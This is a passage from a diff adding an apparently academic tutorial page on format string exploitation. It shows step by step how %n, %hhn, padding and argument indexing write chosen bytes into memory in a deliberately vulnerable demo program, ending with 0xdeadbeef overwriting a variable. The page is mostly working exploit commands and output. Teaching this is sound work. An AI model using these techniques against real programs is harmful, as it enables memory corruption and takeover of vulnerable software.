+Right: ,.%#08x.%#08x.%#08x.%n
+
+Wrong: ,.0xbffff2b0.0x000400.0x000004.
+
+[*] test_val @ 0x804a02c = 34 0x00000022
+</pre>
+
+<p>
+Great! That worked. But, we overwrote the whole target value including
+the A's. That's because we are writing a whole integer. What we really
+want to do is get it to write a single value, maybe just that null
+byte.
+</p>
+
+<p>
+For that, we use the format directive flag <code>h</code>, which specifies using
+the half the format. So, for example, if we used <code>%hn</code> then we are
+writing the number of formatted bytes to a 2-byte short value. And if
+we use <code>%hhn</code>, then we are writing the number of formatted bytes to a
+1-byte char value. For example:
+</p>
+
+<pre class="example">
+user@si485H-base:demo$ ./fmt_vuln $(printf "\x2c\xa0\x04\x08").%#08x.%#08x.%#08x.%hn
+Right: ,.%#08x.%#08x.%#08x.%hn
+
+Wrong: ,.0xbffff2b0.0x000400.0x000004.
+
+[*] test_val @ 0x804a02c = 4259874 0x00410022
+user@si485H-base:demo$ ./fmt_vuln $(printf "\x2c\xa0\x04\x08").%#08x.%#08x.%#08x.%hhn
+Right: ,.%#08x.%#08x.%#08x.%hhn
+
+Wrong: ,.0xbffff2b0.0x000400.0x000004.
+
+[*] test_val @ 0x804a02c = 4276514 0x00414122
+</pre>
+
+<p>
+Now that, we've got that one byte written, we have to align it. We are
+3 bytes off, but that is an easy fix by changing the address of where
+we are writing to.
+</p>
+<pre class="example">
+user@si485H-base:demo$ ./fmt_vuln $(printf "\x2f\xa0\x04\x08").%#08x.%#08x.%#08x.%hhn
+Right: /.%#08x.%#08x.%#08x.%hhn
+
+Wrong: /.0xbffff2b0.0x000400.0x000004.
+
+[*] test_val @ 0x804a02c = 574701889 0x22414141
+</pre>
+</div>
+</div>
+
+
+<div id="outline-container-orgheadline7" class="outline-3">
+<h3 id="orgheadline7"><span class="section-number-3">2.3</span> Controlling what you write</h3>
+<div class="outline-text-3" id="text-2-3">
+<p>
+Now that we can write a single byte, how do we control what we write?
+For that, we have to remember exactly what <code>%n</code> does, it writes the
+number of bytes formatted so far. And, we control how many bytes are
+provided to the format, so we just have to increase or decrease the
+total number of bytes.
+</p>
+
+<p>
+That means, for every additional byte we add prior to the <code>%n</code>, we
+increase the value of the byte we write by one.
+</p>
+<pre class="example">
+user@si485H-base:demo$ ./fmt_vuln $(printf "\x2f\xa0\x04\x08")A.%#08x.%#08x.%#08x.%hhn
+Right: /A.%#08x.%#08x.%#08x.%hhn
+
+Wrong: /A.0xbffff2b0.0x000400.0x000004.
+
+[*] test_val @ 0x804a02c = 591479105 0x23414141
+
+user@si485H-base:demo$ ./fmt_vuln $(printf "\x2f\xa0\x04\x08")AA.%#08x.%#08x.%#08x.%hhn
+Right: /AA.%#08x.%#08x.%#08x.%hhn
+
+Wrong: /AA.0xbffff2b0.0x000400.0x000004.
+
+[*] test_val @ 0x804a02c = 608256321 0x24414141
+
+user@si485H-base:demo$ ./fmt_vuln $(printf "\x2f\xa0\x04\x08")AAAAAAAAAAAAAAAAAAAAAAA.%#08x.%#08x.%#08x.%hhn
+Right: /AAAAAAAAAAAAAAAAAAAAAAA.%#08x.%#08x.%#08x.%hhn
+
+Wrong: /AAAAAAAAAAAAAAAAAAAAAAA.0xbffff290.0x000400.0x000004.
+
+[*] test_val @ 0x804a02c = 960577857 0x39414141
+</pre>
+
+<p>
+You can already start to see a problem: Adding individual values to
+get the value we need can be really annoying. There's a better way,
+and again, it relies on the format directive flags. We can arbitrarily
+increase the length of an output by padding 0's. See below:
+</p>
+
+<pre class="example">
+user@si485H-base:demo$ ./fmt_vuln $(printf "\x2f\xa0\x04\x08").%#08x.%#08x.%#08x.%hhn
+Right: /.%#08x.%#08x.%#08x.%hhn
+
+Wrong: /.0xbffff2b0.0x000400.0x000004.
+
+[*] test_val @ 0x804a02c = 574701889 0x22414141
+user@si485H-base:demo$ ./fmt_vuln $(printf "\x2f\xa0\x04\x08").%#08x.%#08x.%#016x.%hhn
+Right: /.%#08x.%#08x.%#016x.%hhn
+
+Wrong: /.0xbffff2b0.0x000400.0x00000000000004.
+
+[*] test_val @ 0x804a02c = 708919617 0x2a414141
+user@si485H-base:demo$ ./fmt_vuln $(printf "\x2f\xa0\x04\x08").%#08x.%#08x.%#022x.%hhn
+Right: /.%#08x.%#08x.%#022x.%hhn
+
+Wrong: /.0xbffff2b0.0x000400.0x00000000000000000004.
+
+[*] test_val @ 0x804a02c = 809582913 0x30414141
+user@si485H-base:demo$ ./fmt_vuln $(printf "\x2f\xa0\x04\x08").%#08x.%#08x.%#0100x.%hhn
+Right: /.%#08x.%#08x.%#0100x.%hhn
+
+Wrong: /.0xbffff2b0.0x000400.0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000004.
+
+[*] test_val @ 0x804a02c = 2118205761 0x7e414141
+</pre>
+
+
+<p>
+Great! But, there is still one problem here. You may have noticed
+that, the first value we wrote to that byte was 0x22. What if we want
+to write a value less than 0x22? It would seem that we can only add to
+the format length, not decrease. 
+</p>
+
+<p>
+Turns out, we are still in the clear because of overflows. See what
+happens when I set the format length such that we format more than 256
+bytes.
+</p>
+
+<pre class="example">
+user@si485H-base:demo$ ./fmt_vuln $(printf "\x2f\xa0\x04\x08").%#08x.%#08x.%#0228x.%hhn
+Right: /.%#08x.%#08x.%#0228x.%hhn
+
+Wrong: /.0xbffff2b0.0x000400.0x0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000004.
+
+[*] test_val @ 0x804a02c = -29277887 0xfe414141
+user@si485H-base:demo$ ./fmt_vuln $(printf "\x2f\xa0\x04\x08").%#08x.%#08x.%#0229x.%hhn
+Right: /.%#08x.%#08x.%#0229x.%hhn
+
+Wrong: /.0xbffff2b0.0x000400.0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000004.
+
+[*] test_val @ 0x804a02c = -12500671 0xff414141
+user@si485H-base:demo$ ./fmt_vuln $(printf "\x2f\xa0\x04\x08").%#08x.%#08x.%#0230x.%hhn
+Right: /.%#08x.%#08x.%#0230x.%hhn
+
+Wrong: /.0xbffff2b0.0x000400.0x000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000004.
+
+[*] test_val @ 0x804a02c = 4276545 0x00414141
+user@si485H-base:demo$ ./fmt_vuln $(printf "\x2f\xa0\x04\x08").%#08x.%#08x.%#0231x.%hhn
+Right: /.%#08x.%#08x.%#0231x.%hhn
+
+Wrong: /.0xbffff2b0.0x000400.0x0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000004.
+
+[*] test_val @ 0x804a02c = 21053761 0x01414141
+</pre>
+
+<p>
+As we tick over for 0xff, we wrap back around to 0x00 then 0x01 and so
+on. Now we can full control what we write, and to where.
+</p>
+</div>
+</div>
+
+<div id="outline-container-orgheadline8" class="outline-3">
+<h3 id="orgheadline8"><span class="section-number-3">2.4</span> Writting multiple bytes</h3>
+<div class="outline-text-3" id="text-2-4">
+<p>
+The final test is getting to write multiple bytes. Our goal is to
+write 0xdeabeef over the target. We are actually almost there. The
+first thing we need to do is to write 0xbe to the byte we were messing
+with before.
+</p>
+
+<p>
+Doing some math, we see that we were writing 0x22. To get to 0xbe that
+is an additional 156 bytes in the format or so.
+</p>
+
+<pre class="example">
+ser@si485H-base:demo$ ./fmt_vuln $(printf "\x2f\xa0\x04\x08").%#08x.%#08x.%#0156x.%hhn
+Right: /.%#08x.%#08x.%#0156x.%hhn
+
+Wrong: /.0xbffff2b0.0x000400.0x0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000004.
+
+[*] test_val @ 0x804a02c = -1237237439 0xb6414141
+</pre>
+
+<p>
+That was close. We are off by 8. 
+</p>
+<pre class="example">
+user@si485H-base:demo$ ./fmt_vuln $(printf "\x2f\xa0\x04\x08").%#08x.%#08x.%#0164x.%hhn
+Right: /.%#08x.%#08x.%#0164x.%hhn
+
+Wrong: /.0xbffff2b0.0x000400.0x000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000004.
+
+[*] test_val @ 0x804a02c = -1103019711 0xbe414141
+</pre>
+
+
+<p>
+Ok, now we can write the next byte. We do this by adding another
+<code>%hhn</code> to the format string and again, this format directive needs to
+have an address filled. 
+</p>
+
+<pre class="example">
+user@si485H-base:demo$ ./fmt_vuln $(printf "\x2f\xa0\x04\x08")$(printf "\x2e\xa0\x04\x08")%#08x.%#08x.%#0164x.%hhn.%hhn
+Right: /.%#08x.%#08x.%#0164x.%hhn.%hhn
+
+Wrong: /.0xbffff2a0.0x000400.0x000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000004..
+
+[*] test_val @ 0x804a02c = -1044233919 0xc1c24141
+</pre>
+
+<p>
+Crap! We changed our format length. Now we got to do the whole
+calculation again &#x2026; but as usual, there is a better way. 
+</p>
+
+<p>
+Instead of doing these calculations one at a time, lets take advantage
+of the format directives we've learned and try and be smart about
+things. Firsts, let's get verything setup so that we have all our
+<code>%hhn</code> formats to write to each of the bytes in the target variable.
+</p>
+<pre class="example">
+user@si485H-base:demo$ ./fmt_vuln $(printf "\x2f\xa0\x04\x08")$(printf "\x2e\xa0\x04\x08")$(printf "\x2d\xa0\x04\x08")$(printf "\x2c\xa0\x04\x08").%1\$08x.%4\$08x.%1\$08x.%\5\$08x.%1\$08x.%\6\$08x.%1\$08x.%\7\$08x
+Right: /.-,.%1$08x.%4$08x.%1$08x.%5$08x.%1$08x.%6$08x.%1$08x.%7$08x
+
+Wrong: /.-,.bffff280.0804a02f.bffff280.0804a02e.bffff280.0804a02d.bffff280.0804a02c
+
+[*] test_val @ 0x804a02c = 4276545 0x00414141
+</pre>
+<p>
+If you look closely at the format, you see we are doing argument
+indexing to shorten the format length. We now have a bunch of <code>%x</code>
+referencing the address we want to write too plus each has a leading
+<code>%x</code> format so we can adjust the leading zeros to change how much we
+can change the byte we are writing to that address. 
+</p>
+
+<p>
+Now it is just a matter of changing the <code>%x</code> that match the addresses
+we want to write to <code>%hhn</code> and then manipulating the number of 0's in
+the output.
+</p>
+<pre class="example">
+ser@si485H-base:demo$ ./fmt_vuln $(printf "\x2f\xa0\x04\x08")$(printf "\x2e\xa0\x04\x08")$(printf "\x2d\xa0\x04\x08")$(printf "\x2c\xa0\x04\x08").%1\$08x.%4\$hhn.%1\$08x.%\5\$hhn.%1\$08x.%\6\$hhn.%1\$08x.%\7\$hhn
+Right: /.-,.%1$08x.%4$hhn.%1$08x.%5$hhn.%1$08x.%6$hhn.%1$08x.%7$hhn
+
+Wrong: /.-,.bffff280..bffff280..bffff280..bffff280.
+
+[*] test_val @ 0x804a02c = 438578744 0x1a242e38
+</pre>
+
+<p>
+First, we need to change 0x1a into 0xde, that requires 196 additional
+bytes. The first <code>%1$08x</code> changes into <code>%1$0204x</code> (that is, we were
+printing up to 8 leading 0's, now we need 196 more to reach 204
+leading zeros).
+</p>
+<pre class="example">
+user@si485H-base:demo$ ./fmt_vuln $(printf "\x2f\xa0\x04\x08")$(printf "\x2e\xa0\x04\x08")$(printf "\x2d\xa0\x04\x08")$(printf "\x2c\xa0\x04\x08").%1\$0204x.%4\$hhn.%1\$08x.%\5\$hhn.%1\$08x.%\6\$hhn.%1\$08x.%\7\$hhn
+Right: /.-,.%1$0204x.%4$hhn.%1$08x.%5$hhn.%1$08x.%6$hhn.%1$08x.%7$hhn
+
+Wrong: /.-,.0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000bffff280..bffff280..bffff280..bffff280.
+
+[*] test_val @ 0x804a02c = -555158788 0xdee8f2fc
+</pre>
+
+<p>
+Next up, we need to change 0xe8 into 0xad. That will require
+overflowing and coming back around, which means wee need 0xff-0xea+1
+to re-zero than additional 0xad bytes to write, or 195 additional
+bytes. Again, considering that we started by formatting 0x8, that means we change the second <code>%x</code> to have 205 leading zeros. 
+</p>
+
+<pre class="example">
+user@si485H-base:demo$ ./fmt_vuln $(printf "\x2f\xa0\x04\x08")$(printf "\x2e\xa0\x04\x08")$(printf "\x2d\xa0\x04\x08")$(printf "\x2c\xa0\x04\x08").%1\$0204x.%4\$hhn.%1\$0205x.%\5\$hhn.%1\$08x.%\6\$hhn.%1\$08x.%\7\$hhn
+Right: /.-,.%1$0204x.%4$hhn.%1$0205x.%5$hhn.%1$08x.%6$hhn.%1$08x.%7$hhn
+
+Wrong: /.-,.0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000bffff280..00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000bffff280..bffff280..bffff280.
+
+[*] test_val @ 0x804a02c = -559040575 0xdeadb7c1
+</pre>
+
+<p>
+Two more to go. We have <code>0xb7</code> needs to become <code>0xbe</code>. that's easy, that's an additional 7 bytes, so we need to change the next %x to use 15 leading zeros. 
+</p>
+
+<pre class="example">
+user@si485H-base:demo$ ./fmt_vuln $(printf "\x2f\xa0\x04\x08")$(printf "\x2e\xa0\x04\x08")$(printf "\x2d\xa0\x04\x08")$(printf "\x2c\xa0\x04\x08").%1\$0204x.%4\$hhn.%1\$0205x.%\5\$hhn.%1\$015x.%\6\$hhn.%1\$08x.%\7\$hhn
+Right: /.-,.%1$0204x.%4$hhn.%1$0205x.%5$hhn.%1$015x.%6$hhn.%1$08x.%7$hhn
+
+Wrong: /.-,.0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000bffff280..00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000bffff280..0000000bffff280..bffff280.
+
+[*] test_val @ 0x804a02c = -559038776 0xdeadbec8
+</pre>
+
+<p>
+Finally, we have 0xc8 that needs to become 0xef, which requires 39
+additional leading zeros. So the last %x needs to be changed to 47.
+</p>
+
+<pre class="example">
+user@si485H-base:demo$ ./fmt_vuln $(printf "\x2f\xa0\x04\x08")$(printf "\x2e\xa0\x04\x08")$(printf "\x2d\xa0\x04\x08")$(printf "\x2c\xa0\x04\x08").%1\$0204x.%4\$hhn.%1\$0205x.%\5\$hhn.%1\$015x.%\6\$hhn.%1\$047x.%\7\$hhn
+Right: /.-,.%1$0204x.%4$hhn.%1$0205x.%5$hhn.%1$015x.%6$hhn.%1$047x.%7$hhn
+
+Wrong: /.-,.0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000bffff280..00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000bffff280..0000000bffff280..000000000000000000000000000000000000000bffff280.
+
+[*] test_val @ 0x804a02c = -559038737 0xdeadbeef
+</pre>
+
+<p>
+And there it is: DEADBEEF!
+</p>
+</div>
+</div>
+</div>
+</div>
+</body>
+</html>
